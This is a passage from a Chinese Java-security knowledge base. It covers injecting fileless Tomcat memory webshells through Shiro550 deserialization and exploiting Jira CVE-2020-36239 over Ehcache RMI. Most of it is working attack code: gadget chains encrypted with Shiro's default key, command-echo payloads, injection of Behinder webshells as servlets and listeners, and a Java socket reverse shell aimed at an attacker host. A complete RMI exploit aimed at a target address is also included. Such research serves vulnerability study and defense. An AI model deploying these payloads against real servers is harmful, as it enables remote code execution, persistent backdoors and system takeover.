f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformer); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); lazyMap.remove(\"foo\"); Field f3 = transformer.getClass().getDeclaredField(\"iMethodName\"); f3.setAccessible(true); f3.set(transformer,\"newTransformer\"); Field f4 = entry.getClass().getDeclaredField(\"key\"); f4.setAccessible(true); f4.set(entry,templates); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); byte[] payloads = byteArrayOutputStream.toByteArray(); AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } 参考链接 https://blog.csdn.net/m0_67392409/article/details/124100291 https://blog.csdn.net/HongYu012/article/details/123112913 https://xz.aliyun.com/t/7950?page=5 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:38:45 "},"知识库/02.JAVA安全/14.Shiro550无文件内存马/":{"url":"知识库/02.JAVA安全/14.Shiro550无文件内存马/","title":"14.Shiro550无文件内存马","keywords":"","body":"简介 在Tomcat内存马无文件攻击中，介绍了存在反序列化点的时候，发送base64 编码之后的序列化数据，通过反序列化执行代码，注入Tomcat Fiilter，Tomcat Servlet，Tomcat Listener进行无文件生成内存马达到权限维持的目的，本章主要内容是利用shiro的反序列化点进行无文件注入内存马的一些注意事项 shiro550 反序列化由于是存在于Cookie的rememberMe字段中，当将序列化的文件通过base64编码之后，再AES加密生成的AES加密的字符发送到服务端执行反序列化，在shiro550 反序列化分析一文中虽然存在Commons-Collections3.2.1 但是在此过程中存在防护，不能使用Transformer类，就只能使用TemplatesImpl实例化_bytecodes来进行代码执行，以下使用CB1来进行注入 环境 环境搭建参考shiro550 反序列化分析一文中的环境搭建，下面为本次使用的版本信息 jdk jdk8u181 tomcat tomcat8.5.79 攻击流程 和Tomcat内存马无文件攻击一样，首先需要获取获取request，然后通过request获取对应的获取ServletContext，进而获取到StandardContext，进行注入Servlet和Listener，注意这里没有Filter（由于Shiro本身就是一个Filter，我在这里测试发现并不能注入，在将我们的filter放置到最前的时候，会报错，直接进入catch语句里，但是注入Filter类型内存马是可行的，但是暂未复现成功） 注意事项 由于shiro反序列化的时候payload是存放在HTTP Header中，在HTTP 传输协议当中，HTTP头部不能携带超大数据进行传输，当超过最大的限制则会直接报400客户端错误，这一步是最为关键的，在合适的HTTP Header Size才是最优解，看了很多博客尝试通过反射修改Tomcat HTTPHeaderSize尝试之后发现并不可行，在执行过程中报错sun.misc.launcher$appclassloader cannot be cast to org.apache.catalina.loader.webappclassloaderbase大概意思就是未能转化webappclassloaderbase，最终选择使用通用版shiro回显的payload 0x1 注入Servlet普通内存马 这里使用fnmsd大佬提供的payload 获取request，通过编译之后只有3.8K的大小，这里需要继承AbstractTranslet类，因为要通过TemplatesImpl的实例化 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.lang.reflect.Field; import java.util.HashSet; import java.util.Scanner; public class Main extends AbstractTranslet { static HashSet h; static HttpServletRequest r; static HttpServletResponse p; public Main() { r = null; p = null; h = new HashSet(); F(Thread.currentThread(), 0); } private static boolean i(Object obj) { if (obj == null || h.contains(obj)) { return true; } h.add(obj); return false; } private static void p(Object o, int depth) { if (depth > 52 || (r != null && p != null)) { return; } if (!i(o)) { if (r == null && HttpServletRequest.class.isAssignableFrom(o.getClass())) { r = (HttpServletRequest) o; if (r.getParameter(\"cmd\") == null) { r = null; } else { try { p = (HttpServletResponse) r.getClass().getMethod(\"getResponse\").invoke(r); } catch (Exception e) { r = null; } } } if (r != null && p != null) { try { p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); p.getWriter().flush(); } catch (Exception e) { } return; } F(o, depth + 1); } } private static void F(Object start, int depth) { Class n = start.getClass(); do { for (Field declaredField : n.getDeclaredFields()) { declaredField.setAccessible(true); Object o = null; try { o = declaredField.get(start); if (!o.getClass().isArray()) { p(o, depth); } else { for (Object q : (Object[]) o) { p(q, depth); } } } catch (Exception e) { } } } while ( (n = n.getSuperclass()) != null ); } @Override public void transform(DOM d, SerializationHandler[] h) { } @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { } } 再编写CB1链的代码，通过读取Main.class再将其放置在TemplatesImpl的_bytecodes中，最后再反序列化生成cb1.ser package com.test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CB1Test { public static void main(String[] args) throws Exception { byte[] clazzBytes = getBytes(); TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{templates, templates}); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cb1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(Object object, String field, Object args) throws Exception { Field f0 = object.getClass().getDeclaredField(field); f0.setAccessible(true); f0.set(object,args); } public static byte[] getBytes() throws Exception { String tomcatEcho = \"\"; InputStream inputStream = new FileInputStream(tomcatEcho); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } 然后在shiro中对上一步生成的cb1进行base64编码+AES加密 package com.test; import org.apache.shiro.codec.Base64; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.InputStream; public class AESEncode { public static void main(String[] args)throws Exception { String tomcatEcho = \"\"; byte[] key = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); AesCipherService aes = new AesCipherService(); ByteSource ciphertext = aes.encrypt(getBytes(tomcatEcho), key); System.out.printf(ciphertext.toString()); } public static byte[] getBytes(String path) throws Exception{ InputStream inputStream = new FileInputStream(path); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } 第一步首先编译Main.java 第二步，将编译生成的Main.class写入到TemplatesImpl._bytecodes中 第三步，将序列化得到的CB1.ser通过AES加密，放置到Cookie的rememberMe字段中 最后携带参数即可执行命令 在此过程中我们可以发现，要执行命令就必须得带上这一串臃肿的Cookie，这显然与我们的注入内存马还是有点偏差，那么需要如何改造呢？当然还是得注入Servlet或者Listener 如果在fnmsd大佬提供的payload，那么还是会超过MaxHTTPHeaderSize，那么我们知道HTTP协议中POST请求的参数可以携带大体积的参数，那么就只需要在该payload中再添加一个反序列化点，在POST请求体中获取反序列化的地方，进行反序列化完成二次注入，这样来执行命令 首先完善payload，加上获取data参数的逻辑，再进行反序列化 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import sun.misc.BASE64Decoder; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.lang.reflect.Field; import java.util.HashSet; import java.util.Scanner; public class Main extends AbstractTranslet { static HashSet h; static HttpServletRequest r; static HttpServletResponse p; public Main() { r = null; p = null; h = new HashSet(); F(Thread.currentThread(), 0); } private static boolean i(Object obj) { if (obj == null || h.contains(obj)) { return true; } h.add(obj); return false; } private static void p(Object o, int depth) { if (depth > 52 || (r != null && p != null)) { return; } if (!i(o)) { if (r == null && HttpServletRequest.class.isAssignableFrom(o.getClass())) { r = (HttpServletRequest) o; if (r.getParameter(\"cmd\") == null) { r = null; } else { try { p = (HttpServletResponse) r.getClass().getMethod(\"getResponse\").invoke(r); } catch (Exception e) { r = null; } } } if (r != null && p != null) { try { if(r.getParameter(\"data\")!=null){ byte[] buff = new BASE64Decoder().decodeBuffer(r.getParameter(\"data\")); ByteArrayInputStream bai = new ByteArrayInputStream(buff); ObjectInputStream ois = new ObjectInputStream(bai); ois.readObject(); }else{ p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); p.getWriter().flush(); } } catch (Exception e) { } return; } F(o, depth + 1); } } private static void F(Object start, int depth) { Class n = start.getClass(); do { for (Field declaredField : n.getDeclaredFields()) { declaredField.setAccessible(true); Object o = null; try { o = declaredField.get(start); if (!o.getClass().isArray()) { p(o, depth); } else { for (Object q : (Object[]) o) { p(q, depth); } } } catch (Exception e) { } } } while ( (n = n.getSuperclass()) != null ); } @Override public void transform(DOM d, SerializationHandler[] h) { } @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { } } 然后这里使用天下大木头的TomcatEcho.java的代码，修改修改，使用遍历Thread获取request public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 当获取到request之后，完成注入servlet的代码 static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } 最后再在servlet的service中添加恶意代码 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; response.getWriter().println(new Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd2\")).getInputStream()).useDelimiter(\"\\\\A\").next()); response.getWriter().flush(); } catch (Exception e) { e.printStackTrace(); } } 完整代码如下： import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; import java.util.Scanner; public class Behinder extends AbstractTranslet implements Servlet { private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; public Behinder() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 然后使用CB1序列化成文件，通过data参数传输过去 步骤 首先先使用shiro的反序列化，先序列化Main.class，通过base64编码+AES编码之后查看payload是否可用 然后将需要注入的servlet通过cb1序列化 再使用POST请求，data参数携带这一串base64编码之后的CB1.ser，传输的时候一定要记得url编码 然后去掉Cookie，所有的参数，使用cmd2参数执行命令 当普通马都能注入，那就继续注入冰蝎马（这里说一下，为什么我对冰蝎情有独钟😂，普通马在url中可以执行其实也行，主要是客户端webshell管理工具用起来真的很爽😂) 0x2 注入Servlet 冰歇马 同Tomcat内存马无文件攻击中的Servlet注入冰歇马一样，同样通过在service方法中添加冰蝎马 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } } catch (Exception e) { e.printStackTrace(); } } 完整代码如下 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; import java.util.Scanner; public class Behinder extends AbstractTranslet implements Servlet { private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; public Behinder() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 同上步骤，在data参数处，反序列化以上代码生成的序列化文件 首先生成cookie，查看是否正常 再将Servlet内存冰歇马序列化，最后再通过data参数传输 0x3 注入Listener冰歇内存马 同Tomcat内存马无文件攻击中的Listener注入冰蝎马一样 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; public class BehinderListener extends AbstractTranslet implements ServletRequestListener { public BehinderListener() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletRequestListener listener = new BehinderListener(); standardContext.addApplicationEventListener(listener); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 提出问题 在天下大木头的github中，提供的payload-TomcatEcho.ser、TomcatEcho.java中，我在本地编译生成TomcatEcho.class，以及TomcatEcho.ser文件大小都超过了MaxHTTPHeaderSize，我自己编译的文件都无法反序列化，但是天下大木头提供的TomcatEcho.ser就可以注入成功，该环境下的tomcatHeader.ser、tomcatInject.ser无法使用，报错为文章开头的未能转化webappclassloaderbase 参考链接 fnmsd-Java中间件通用回显方法的问题及处理 fnmsd-通用版shiro回显 天下大木头-ShiroVulnEnv Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:39:10 "},"知识库/02.JAVA安全/15.Jira CVE2020-36239 RCE/":{"url":"知识库/02.JAVA安全/15.Jira CVE2020-36239 RCE/","title":"15.Jira CVE2020-36239 RCE","keywords":"","body":"简介 2021 年 7 月 9 日上午 5:44 Jira 官方发布公告 《Jira 数据中心和 Jira 服务管理数据中心 - Ehcache RMI 缺少身份验证 - CVE-2020-36239(https://jira.atlassian.com/browse/JSDSERVER-8454)》, 该漏洞影响多个产品的多个版本,官方已给出修复方法。详细请关注 Jira 官网，将软件更新至安全版本: https://jira.atlassian.com/ 背景 由于在复现CVE2020-36239这个漏洞的时候，使用ysoserial项目中的代码，执行CB1，无法成功利用反弹shell，执行任意命令，导致一直在找问题，最后通过和同事沟通，发现该漏洞存在的Commons Beanutils 确实是可以利用，但是Commons Collections 版本较高，是无法利用成功的；仔细查看其实所有的CC链，CB链其实就是代码执行，只是执行的代码是Runtime.getRuntime.exec(cmd)，其中cmd为需要执行的命令，在部署的目标测试环境，通过实验最后得知，在使用Runtime.getRuntime.exec(cmd)是无法执行命令（反弹shell）最后通过修改代码执行逻辑，使用Java的socket编程来反弹shell。 漏洞分析 根据官方的描述该漏洞是因为: 暴露了一个 Ehcache RMI 网络服务，攻击者可以在端口 40001 和潜在的 40011 上连接到该服务，由于缺少身份验证漏洞，可以通过反序列化在 Jira 中执行他们选择的任意代码 使用Nmap扫描 nmap -T 4 -A 10.1.1.13 -p 40001 其中绑定的name为rmi://com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey;绑定的实例接口为net.sf.ehcache.distribution.RMICachePeer_Stub 漏洞触发点 在 net.sf.ehcache.distribution.RMICachePeer_Stub 找触发点, 官方通报中说是 Ehcache 暴露的 RMI 服务，所以实体类应该也在 Ehcache 包里 在绑定的 net.sf.ehcache.distribution.RMICachePeer_Stub类中的 getQuiet方法接收的参数是 Serializeable对象，这里就是漏洞的触发点 漏洞验证 所有绑定的 name, 都是绑定 net.sf.ehcache.distribution.RMICachePeer_Stub, 所以随机选一个就可以了， 使用 URLDNS 验证了漏洞确实存在 package com.myproject.temp; import net.sf.ehcache.distribution.RMICachePeer_Stub; import java.lang.reflect.Field; import java.net.URL; import java.rmi.Naming; import java.util.HashMap; public class Test { public static void main(String[] args) throws Exception { URL url = new URL(\"http://vd2vvt.dnslog.cn\"); HashMap hashMap = new HashMap(); hashMap.put(url,\"hhh\"); Field field = URL.class.getDeclaredField(\"hashCode\"); field.setAccessible(true); field.setInt(url,-1); RMICachePeer_Stub rmiCachePeer_stub = (RMICachePeer_Stub) Naming.lookup(\"rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey\"); rmiCachePeer_stub.getQuiet(hashMap); } } 通过查看Jira 是否用了存在利用链的包，Commons-Collection 都用了相对安全的版本，但是 Commons-Beanutils 1.9.4 存在利用链，那么就可以利用CB1来构造序列化对象 EXP 首先编写shell.java，利用socket 编程反弹shell到目标地址，注意这里一定要写进无参构造函数，因为利用CB1链，通过javassit写入到新的类，再将其转换成bytecode 放在TemplatesImpl._bytecodes时，最后执行的是newInstance()，也就是实例化的过程，需要放在构造函数中 package com.myproject.temp; public class shell { public shell(){ try{ String host = \"xxx.xxx.xxx.xxx\"; int port = port; String cmd = \"/bin/bash\"; java.lang.Process p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); java.net.Socket s = new java.net.Socket(host, port); java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream(); while (!s.isClosed()) { while (pi.available() > 0) { so.write(pi.read()); } while (pe.available() > 0) { so.write(pe.read()); } while (si.available() > 0) { po.write(si.read()); } so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) { } } p.destroy(); s.close(); }catch (Exception e){} } public static void main(String[] args) { System.out.println(123); } } 然后需要编写一个ClassLoader，让javassist从源中读取该类文件，并返回CtClass对该类文件的对象的引用，主要原因是因为要将shell.class 转换成base64编码进行写入，最后再通过classloader进行解码，再将其转换成bytecode，放入到Templates._bytecode中 这里参考的是Y4er——ysoserial大哥更改后的项目 package com.myproject.temp; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; import java.util.zip.GZIPInputStream; public class ClassLoaderTemplate { static String b64; static { try { GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64))); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bs = new byte[4096]; int read; while ((read = gzipInputStream.read(bs)) != -1) { byteArrayOutputStream.write(bs, 0, read); } byte[] bytes = byteArrayOutputStream.toByteArray(); ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClass.setAccessible(true); Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length); invoke.newInstance(); } catch (Exception e) { // e.printStackTrace(); } } public static byte[] base64Decode(String bs) throws Exception { Class base64; byte[] value = null; try { base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e) { try { base64 = Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) { } } return value; } } 最后再将CB1的逻辑完成，如下所示 PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f3 = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"comparator\"); f4.setAccessible(true); f4.set(queue,comparator); Field f5 = queue.getClass().getDeclaredField(\"queue\"); f5.setAccessible(true); Object[] queueArray = (Object[]) f5.get(queue); queueArray[0] = templates; 完整代码如下 package com.myproject.temp; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import net.sf.ehcache.distribution.RMICachePeer_Stub; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.codec.binary.Base64; import org.apache.wicket.util.file.Files; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.Serializable; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.rmi.Naming; import java.util.PriorityQueue; import java.util.zip.GZIPOutputStream; public class Test_2 { public static void main(String[] args) throws Exception { byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/CodeReview/JavaCode/Project/target/classes/com/myproject/temp/shell.class\")); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass superC = pool.get(AbstractTranslet.class.getName()); CtClass ctClass; ctClass = pool.get(\"com.myproject.temp.ClassLoaderTemplate\"); ctClass.setName(ctClass.getName() + System.nanoTime()); ByteArrayOutputStream outBuf = new ByteArrayOutputStream(); GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf); gzipOutputStream.write(ctBytes); gzipOutputStream.close(); String content = \"b64=\\\"\" + Base64.encodeBase64String(outBuf.toByteArray()) + \"\\\";\"; ctClass.makeClassInitializer().insertBefore(content); ctClass.setSuperclass(superC); ctClass.writeFile(); byte[] classBytes = ctClass.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f3 = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"comparator\"); f4.setAccessible(true); f4.set(queue,comparator); Field f5 = queue.getClass().getDeclaredField(\"queue\"); f5.setAccessible(true); Object[] queueArray = (Object[]) f5.get(queue); queueArray[0] = templates; Serializable payload = (Serializable) queue; RMICachePeer_Stub rmiCachePeer_stub = (RMICachePeer_Stub) Naming.lookup(\"rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey\"); rmiCachePeer_stub.getQuiet(payload); } } 参考链接 https://forum.butian.net/share/653 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:25:34 